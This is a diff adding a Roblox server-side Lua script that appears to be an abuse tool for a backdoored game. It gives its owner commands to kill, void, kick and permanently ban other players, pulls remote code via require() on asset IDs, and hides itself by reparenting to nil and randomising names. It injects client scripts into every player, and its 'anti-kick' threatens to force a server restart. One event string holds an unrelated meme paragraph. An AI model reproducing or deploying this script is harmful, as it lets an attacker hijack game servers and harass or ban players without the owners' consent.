+			NewBaseplate.Size = Vector3.new(2048, 16, 2048)
+			NewBaseplate.Position = BaseplatePos
+			Remote:FireAllClients("MakeText",{Text = "Successfully added baseplate",ClientSide = false})
+		elseif string.lower(string.sub(Msg, 1, 6)) == "grass/" then
+			game:GetService("Debris"):AddItem(game:FindFirstChild("Baseplate", true), 0)
+			if game.GameId == 7905856990 then
+				game:GetService("Debris"):AddItem(workspace["Baseplate 2021"], 0)
+			end
+			local NewBaseplate = script.Baseplate:Clone()
+			game:GetService("Debris"):AddItem(NewBaseplate.Texture, 0)
+			NewBaseplate.Parent = workspace
+			NewBaseplate.Size = Vector3.new(2048, 16, 2048)
+			NewBaseplate.Position = BaseplatePos
+			NewBaseplate.Material = Enum.Material.Grass
+			NewBaseplate.Color = Color3.fromRGB(58, 125, 21)
+			Remote:FireAllClients("MakeText",{Text = "Successfully added grass baseplate",ClientSide = false})
+		elseif string.lower(string.sub(Msg, 1, 5)) == "time/" then
+			local initialtime = game:GetService("Lighting").ClockTime
+			local newtime = string.sub(Msg, 6)
+			local ts = game:GetService("TweenService")
+			local ti = TweenInfo.new(
+				math.abs(initialtime - tonumber(newtime)) / 2,
+				Enum.EasingStyle.Quad,
+				Enum.EasingDirection.InOut,
+				0,
+				false,
+				0
+			)
+			local tg = { ClockTime = tonumber(newtime) }
+			local t = ts:Create(game:GetService("Lighting"), ti, tg)
+			t:Play()
+			task.wait(math.abs(initialtime - tonumber(newtime)))
+			Remote:FireAllClients("MakeText",{Text = "Successfully changed time",ClientSide = false})
+		elseif string.lower(string.sub(Msg, 1, 3)) == "ad/" then
+			local p = Player
+			local i = 10676598255
+			require(i).cool()
+			Remote:FireAllClients("MakeText",{Text = "Successfully loaded Adonis edit",ClientSide = false})
+		elseif string.lower(string.sub(Msg, 1, 3)) == "as/" then
+			local String = string.sub(Msg, 4)
+			if string.lower(String) == "sksh" then
+				local p = Player
+				local i = 18660367646
+				require(i)()
+				Remote:FireAllClients("MakeText",{Text = "Successfully loaded Skid Shield",ClientSide = false})
+			elseif string.lower(String) == "atsk" then
+				local p = Player
+				local i = 10304477576
+				require(i).AntiSkid()
+				Remote:FireAllClients("MakeText",{Text = "Successfully loaded Anti Skid V14",ClientSide = false})
+			elseif string.lower(String) == "nosk" then
+				local p = Player
+				local i = 10188053692
+				require(i).NoSkid()
+				Remote:FireAllClients("MakeText",{Text = "Successfully loadded No Skid",ClientSide = false})
+			elseif string.lower(String) == "nebatab" then
+				local p = Player
+				local i = 15591025510
+				require(i)
+				Remote:FireAllClients("MakeText",{Text = "Successfully loaded Neb's Anti Abuse",ClientSide = false})
+			elseif string.lower(String) == "grvyatsk" then
+				local p = Player
+				local i = 15829257726
+				require(i):Start()
+				Remote:FireAllClients("MakeText",{Text = "Successfully loaded Groovy's Anti Skid",ClientSide = false})
+			else
+				Remote:FireAllClients("MakeText",{Text = "missing argument of anti skid current ones are: sksh-Skid Shield,atsk-Anti Skid V14,nosk-No Skid,nebatab-Neb's Anti Abuse,grvyatsk-Groovy's Total Anti Abuse",ClientSide = true})
+			end
+		elseif string.lower(string.sub(Msg,1,2)) == [[\n]] then
+			Remote:FireAllClients("MakeText",{Text = "ok so basically u need to jmhnkxbvhdsyfefkewhgfieabvfqewauihgyuierfvb then contact mecinn",ClientSide = false})
+		end
+	end)
+end
+function RemoteFunc(plr,typ,thing)
+	if typ == "whatsmyownerdamn" then
+		ClientActors[plr.Name].Parent = nil
+		Remote:FireClient(plr,"theowner",{Owner = Player})
+	end
+	if plr == Player then
+		if typ == "Command" then
+			Command(thing.CmdString)
+		elseif typ == "SOURCEV5PROPTABLE" then
+			local T = thing or {}
+			T["Owner"] = Player
+			--
+			T["VisStyleId"] = VisStyleId
+			T["Damage"] = Damage
+			T["DamageType"] = DamageType
+			T["KillType"] = KillType
+			T["KillMethod"] = KillMethod
+			T["SoundId"] = SoundId
+			T["Volume"] = Volume
+			T["ReColor"] = ReColor
+			T["FirstColor"] = FirstColor
+			T["TurnVisColor"] = TurnVisColor
+			T["VisCubeEnabled"] = VisCubeEnabled
+			T["AudioBalance"] = AudioBalance
+			--
+			Remote:FireAllClients("SOURCEV5PROPTABLE",T)
+		elseif typ == "DoFunctionIdk" then
+			Remote:FireAllClients("DoFunctionIdk",thing)
+		elseif typ == "KillType" then
+			if KillType == "Server" then
+				KillType = "Client"
+				Remote:FireAllClients("MakeText",{Text = "Changed to Client Kill",ClientSide = true})
+			elseif KillType == "Client" then
+				KillType = "Server"
+				Remote:FireAllClients("MakeText",{Text = "Changed to Server Kill",ClientSide = true})
+			else
+				KillType = "Server"
+				Remote:FireAllClients("MakeText",{Text = "Changed to Server Kill",ClientSide = true})
+			end
+		elseif typ == "KillMethod" then
+			local Add = KillMethod + 1
+			if Add > 23 then
+				Add = 1
+			end
+			KillMethod = Add
+			if KillMethod == 1 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Destroy",ClientSide = false})
+			elseif KillMethod == 2 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Transparency",ClientSide = false})
+			elseif KillMethod == 3 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to BulkMoveTo Void",ClientSide = false})
+			elseif KillMethod == 4 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Apply Empty Mesh Derender",ClientSide = false})
+			elseif KillMethod == 5 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Size Mesh Derender",ClientSide = false})
+			elseif KillMethod == 6 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Offset Mesh Derender",ClientSide = false})
+			elseif KillMethod == 7 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to ViewportFrame Derender",ClientSide = false})
+			elseif KillMethod == 8 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Roblox Lock",ClientSide = false})
+			elseif KillMethod == 9 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to TranslateBy Void",ClientSide = false})
+			elseif KillMethod == 10 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Current CFrame",ClientSide = false})
+			elseif KillMethod == 11 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Impulse Void",ClientSide = false})
+			elseif KillMethod == 12 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Pivot Offset Void",ClientSide = false})
+			elseif KillMethod == 13 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Size Derender",ClientSide = false})
+			elseif KillMethod == 14 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to System Derender",ClientSide = false})
+			elseif KillMethod == 15 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Property Kill",ClientSide = false})
+			elseif KillMethod == 16 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Mesh Degradation",ClientSide = false})
+			elseif KillMethod == 17 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Amplified Impulse Void",ClientSide = false})
+			elseif KillMethod == 18 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Lobotomize Player",ClientSide = false})
+			elseif KillMethod == 19 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Kick Player",ClientSide = false})
+			elseif KillMethod == 20 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Server Ban Player",ClientSide = false})
+			elseif KillMethod == 21 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Time Ban Player",ClientSide = false})
+			elseif KillMethod == 22 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Perm Ban Player",ClientSide = false})
+			elseif KillMethod == 23 then
+				Remote:FireAllClients("MakeText",{Text = "Kill Method Changed to Void",ClientSide = false})
+			end
+		elseif typ == "SetTheme" then
+			SoundId = tostring(thing)
+			Remote:FireAllClients("TimePosition",{TimePos = 0})
+		elseif typ == "DamageType" then
+			if DamageType == "Ray" then
+				DamageType = "Distance"
+				Remote:FireAllClients("MakeText",{Text = "DamageType Changed to Distance",ClientSide = true})
+			elseif DamageType == "Distance" then
+				DamageType = "Ray"
+				Remote:FireAllClients("MakeText",{Text = "DamageType Changed to Ray",ClientSide = true})
+			else
+				DamageType = "Ray"
+				Remote:FireAllClients("MakeText",{Text = "DamageType Changed to Ray",ClientSide = true})
+			end
+		elseif typ == "DamageBoolean" then
+			Damage = not Damage
+			if Damage == true then
+				Remote:FireAllClients("MakeText",{Text = "Damage Changed to true",ClientSide = true})
+			elseif Damage == false then
+				Remote:FireAllClients("MakeText",{Text = "Damage Changed to false",ClientSide = true})
+			end
+		elseif typ == "KillMode" then
+			local Add = KillMode + 1
+			if Add > 3 then
+				Add = 1
+			end
+			KillMode = Add
+			if KillMode == 1 then
+				Remote:FireAllClients("MakeText",{Text = "KillMode Changed to Parts",ClientSide = true})
+			elseif KillMode == 2 then
+				Remote:FireAllClients("MakeText",{Text = "KillMode Changed to Health",ClientSide = true})
+			elseif KillMode == 3 then
+				Remote:FireAllClients("MakeText",{Text = "KillMode Changed to Kill Method",ClientSide = true})
+			end
+		elseif typ == "Kill" then
+			KillFunction(thing.Pos,thing.Range)
+		elseif typ == "ToggleAntiKick" then
+			AntiKickEnabled = not AntiKickEnabled
+			if AntiKickEnabled == false then
+				Remote:FireAllClients("MakeText",{Text = "Anti-Kick Changed to false",ClientSide = false})
+			else
+				Remote:FireAllClients("MakeText",{Text = "Anti-Kick Changed to true",ClientSide = false})
+			end
+		elseif typ == "FunniTaunt" then
+			Remote:FireAllClients("FunniTaunt",{})
+		elseif typ == "ClearTable" then
+			MakeFunction(function()table.clear(VoidTable)end)
+			MakeFunction(function()table.clear(VoidTable2.ClassName)end)
+			MakeFunction(function()table.clear(VoidTable2.Locked)end)
+			MakeFunction(function()table.clear(VoidTable2.Anchored)end)
+			MakeFunction(function()table.clear(VoidTable2.CanCollide)end)
+			MakeFunction(function()table.clear(VoidTable2.CanQuery)end)
+			MakeFunction(function()table.clear(VoidTable2.CanTouch)end)
+			MakeFunction(function()table.clear(VoidTable2.Massless)end)
+			Remote:FireAllClients("ClearTable",{})
+			StartVoid = false
+		elseif typ == "Reset" then
+			Remote:FireAllClients("Reset",{})
+		end
+	end
+end
+
+function RenderEvWait(Num)
+	if typeof(Num) == "number" then
+		if Num > 0 then
+			for i=1,Num do
+				game:GetService("RunService").RenderStepped:Wait()
+			end
+		else
+			game:GetService("RunService").RenderStepped:Wait()
+		end
+	else
+		game:GetService("RunService").RenderStepped:Wait()
+	end
+end
+
+function DisconnectAll()
+	ScriptEnded = true
+	MakeFunction(function()
+		MakeFunction(function()table.clear(VoidTable)end)
+		MakeFunction(function()table.clear(VoidTable2.ClassName)end)
+		MakeFunction(function()table.clear(VoidTable2.Locked)end)
+		MakeFunction(function()table.clear(VoidTable2.Anchored)end)
+		MakeFunction(function()table.clear(VoidTable2.CanCollide)end)
+		MakeFunction(function()table.clear(VoidTable2.CanQuery)end)
+		MakeFunction(function()table.clear(VoidTable2.CanTouch)end)
+		MakeFunction(function()table.clear(VoidTable2.Massless)end)
+		pcall(function()Remote:FireAllClients("ClearTable",{});end)
+		pcall(function()
+			pcall(function()
+				Loop:Disconnect()
+				Added:Disconnect()
+				Removing:Disconnect()
+				RemoteF:Disconnect()
+				CharAdded:Disconnect()
+				Chatted:Disconnect()
+			end)
+			pcall(function()Remote:FireAllClients("Su Tart, the legendary Roblox character from Flamingo’s YouTube channel, is more than just a meme—he’s a cultural phenomenon within the community, embodying the chaotic, surreal humor that Albert (Flamingo) has perfected over the years, and his presence in countless videos has cemented him as one of the most recognizable figures in the Roblox YouTube sphere, not because he is heroic or skilled, but because he is hilariously tragic, endlessly unlucky, and strangely relatable, with his broken grammar, childlike innocence, and perpetual sadness creating a character that feels both absurd and oddly human, as he wanders through roleplay servers typing things like “su tart sad” or “su tart need mom,” phrases that have become iconic catchphrases repeated by fans across social media, Roblox servers, and even in real life conversations, turning him into a symbol of the bizarre yet endearing culture Flamingo cultivates; his misadventures often involve being bullied, ignored, or rejected by other players, yet he continues to persist, embodying resilience in the face of endless chaos, and this resilience is part of why fans adore him—he is the underdog of the Roblox universe, a tragic clown whose suffering is played for laughs but also sparks genuine sympathy, and his legacy has grown beyond the videos themselves, inspiring fan art, spin-off memes, and even entire communities dedicated to celebrating his existence, with Su Tart becoming a kind of mascot for Flamingo’s brand of humor, representing the absurdity of online roleplay culture while also serving as a reminder of how comedy can emerge from the strangest, most unexpected places, and as Flamingo continues to evolve his content, Su Tart remains a constant, a reminder of the channel’s roots in chaotic roleplay servers, a character who is simultaneously mocked and loved, pitied and celebrated, and whose broken sentences and sad demeanor resonate with fans as both parody and strangely relatable commentary on the feeling of being lost in the digital world, making Su Tart not just a character but a cult icon whose tragicomic existence will continue to echo through the Roblox community for years to come, ensuring that every time someone types “su tart sad,” they are not just quoting a meme but participating in a shared cultural joke that binds Flamingo’s audience together in laughter, irony, and affection for this endlessly unlucky yet unforgettable figure.",{})end)
+			pcall(function()
+				for i,v in pairs(ClientInstances) do
+					if typeof(v) == "Instance" then
+						MakeFunction(function()
+							task.wait(10)
+							v:Destroy()
+						end)
+					end
+				end
+				pcall(function()
+					DestroyOnTime(Remote,10)
+				end)
+			end)
+			CharAdded:Disconnect()
+		end)
+		wait()
+		pcall(function() if typeof(Player) == "Instance" and Player:IsA("Player") then Player:LoadCharacter() end end)
+	end)
+	Player.DevEnableMouseLock = LastLockVal
+end
+function FixTheRemoteNOW()
+	MakeFunction(function()
+		MakeFunction(function()Remote:Destroy();end)
+		MakeFunction(function()RemoteF:Disconnect()end)
+		Remote = NewRemote()
+		RemoteF = Remote.OnServerEvent:Connect(function(_,a,b)
+			RemoteFunc(_,a,b)
+		end)
+	end)
+end
+Remote = NewRemote()
+RemoteF = Remote.OnServerEvent:Connect(function(_,a,b)
+	RemoteFunc(_,a,b)
+end)
+RemoteDest = game.DescendantRemoving:Connect(function(v)
+	if v == Remote or not Remote or not Remote:IsDescendantOf(game) or Remote.Parent ~= game:GetService(LastRemoteParent) or Remote.Name ~= Code then
+		FixTheRemoteNOW()
+	end
+end)
+Loop = game:GetService("RunService").Stepped:Connect(function(hb)
+	MakeFunction(function()
+		Stall(1,function()
+			Actor = script.Parent
+			script.Parent = Actor
+			Actor.Parent = nil
+		end)
+	end)
+	if not Remote or not Remote:IsDescendantOf(game) or Remote.Parent ~= game:GetService(LastRemoteParent) or Remote.Name ~= Code then
+		FixTheRemoteNOW()
+	end
+end)
+pcall(function()
+	Player.Character = nil
+	Character:Destroy()
+end)
+CharAdded = Player.CharacterAdded:Connect(function()
+	local w = Player.Character
+	Player.Character = nil
+	w:Destroy()
+end)
+ToolAdded = Backpack.ChildAdded:Connect(function(v)
+	v:Destroy()
+end)
+function BooleanConv(String)
+	local Bool = false
+	if string.lower(String) == "true" then
+		Bool = true
+	elseif string.lower(String) == "false" then
+		Bool = false
+	end
+	return Bool
+end
+Chatted = Player.Chatted:Connect(function(Msg_)
+	local Msg,SendMessage = Msg_,true
+	if string.sub(Msg,1,3)=="/e "then Msg,SendMessage=string.sub(Msg,4),false;end
+	if string.lower(string.sub(Msg,1,7)) == "fixrem/" then
+		SendMessage = false
+		MakeFunction(function()
+			Remote:Destroy()
+		end)
+	end
+	MakeFunction(function() Command(Msg) end)
+	if SendMessage == true then
+		MakeFunction(function()Remote:FireAllClients("MakeText",{Text = Msg_,ClientSide = false})end)
+	end
+end)
+
+MakeFunction(function()
+	while task.wait(3) do
+		for _,p in pairs(game:GetService("Players"):GetPlayers()) do
+			if table.find(ServerBans,p.UserId) then
+				p:Kick("Server banned by Cinn")
+			elseif PermBans:GetAsync("Ban_"..p.UserId) and PermBans:GetAsync("Ban_"..p.UserId) == true then
+				p:Kick("Permanently banned by Cinn (dm ._hkmorii to be unbanned and also tell me what game it was in)")
+			end
+		end
+	end
+end)
+
+MakeFunction(function()
+	pcall(antis)
+end)
+
+function SetClient(Plr)
+	local NewClient = Client:Clone()
+	NewClient.Name = RandomString()
+	local Actor = NewClient:FindFirstChildOfClass("Actor")
+	local NewClientLocal = Actor:FindFirstChildWhichIsA("LocalScript")
+	NewClientLocal:SetAttribute("RootPos",RootPos)
+	ApplyRandomString(NewClient)
+	for Pos,Val in pairs(ClientAssets:GetChildren()) do
+		if typeof(Val) == "Instance" then
+			Val:Clone().Parent = NewClientLocal
+		end
+	end
+	for _, meshes in pairs(script:GetChildren()) do
+		if meshes.Name:find("Mesh") then
+			meshes:Clone().Parent = NewClientLocal
+		end
+	end
+	NewClientLocal:SetAttribute("Code",Code)
+	NewClient.ResetOnSpawn = false
+	NewClientLocal.Enabled = true
+	table.insert(ClientInstances,NewClientLocal)
+	table.insert(ClientInstances,NewClient)
+	ClientActors[Plr.Name] = Actor
+	NewClient.Parent = Plr.PlayerGui
+	task.delay(5,function()
+		while true do
+			RenderEvWait()
+			NewClientLocal.Parent = Actor
+			Actor.Parent = nil
+		end
+	end)
+end
+Added = game:GetService("Players").PlayerAdded:Connect(function(Plr)
+	SetClient(Plr)
+end)
+DAdded = game.DescendantAdded:Connect(function(_)
+	if StartVoid~=true then return end
+	local Bool = CheckP(_)
+	if Bool == true then
+		Void(_)
+	end
+end)
+
+local attempts = 0
+
+function notify(text)
+	MakeFunction(function()
+		local msg = Instance.new("Message")
+		msg.Text = tostring(text)
+		msg.Parent = workspace
+		task.delay(3.5,function()
+			pcall(game.Destroy,msg)
+		end)
+	end)
+end
+
+function forcetpall()
+	local function tpplrs()
+		pcall(function()
+			for _,p in pairs(game:GetService("Players"):GetPlayers()) do
+				local holder = p:FindFirstChildOfClass("PlayerGui") or p:FindFirstChildOfClass("Backpack") or Instance.new("Backpack",p)
+				if not holder:FindFirstChild("NewServerActor") then
+					local scr = script.NewServer:Clone()
+					local act = Instance.new("Actor")
+					act.Name = "NewServerActor"
+					scr.Parent = act
+					act.Parent = holder
+					scr.Enabled = true
+				end
+			end
+		end)
+	end
+
+	game:GetService("RunService").Heartbeat:ConnectParallel(function()
+		task.synchronize()
+		tpplrs()
+	end)
+
+	game:GetService("RunService").Heartbeat:Connect(function()
+		tpplrs()
+	end)
+
+	task.spawn(function()
+		while true do
+			tpplrs()
+			task.wait()
+		end
+	end)
+end
+
+MakeFunction(function()
+	while task.wait(180) do
+		if attempts > 0 then
+			attempts -= 1
+			notify("(ANTI-KICK::Cinnantax) WARNINGS HAVE LOWERED BY ONE DUE TO INACTIVITY | CURRENT WARNINGS: "..attempts)
+		end
+	end
+end)
+
+game:GetService("Players").PlayerRemoving:Connect(function(Plr)
+	if Plr.UserId == UserId then
+		if AntiKickEnabled == false then
+			return
+		end
+		game:GetService("TeleportService"):Teleport(game.PlaceId,Plr)
+		Plr:Kick("(ANTI-KICK::Cinnantax) You we're kicked by someone. We are attempting to make you rejoin.")
+		attempts += 1
+		if attempts > 0 then
+			if attempts == 1 then
+				notify("(ANTI-KICK::Cinnantax) WARNING: YOU HAVE KICKED A PROTECTED USER! | CURRENT WARNINGS: "..attempts)
+			elseif attempts == 2 then
+				notify("(ANTI-KICK::Cinnantax) WARNING: YOU HAVE KICKED A PROTECTED USER! | CURRENT WARNINGS: "..attempts)
+			elseif attempts == 3 then
+				notify("(ANTI-KICK::Cinnantax) WARNING: YOU HAVE BANNED A PROTECTED USER! UNBAN THEM OR ELSE THE SERVER WILL RESTART! | CURRENT WARNINGS: "..attempts)
+			elseif attempts == 4 then
+				notify("(ANTI-KICK::Cinnantax) FINAL WARNING: YOU HAVE BANNED A PROTECTED USER! UNBAN THEM OR ELSE THE SERVER WILL RESTART! | CURRENT WARNINGS: "..attempts)
+			elseif attempts >= 5 then
+				notify("(ANTI-KICK::Cinnantax) WARNING LIMIT REACHED INITIATING SERVER RESTART! | CURRENT WARNINGS: "..attempts)
+				task.delay(2,function()
+					forcetpall()
+				end)
+			end
+		end
+	end
+end)
+
+Removing = game:GetService("Players").PlayerRemoving:Connect(function(Plr)
+	if Plr.UserId == UserId then
+		DisconnectAll()
+	end
+end)
+for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
+	if Plr then
+		SetClient(Plr)
+	end
+end
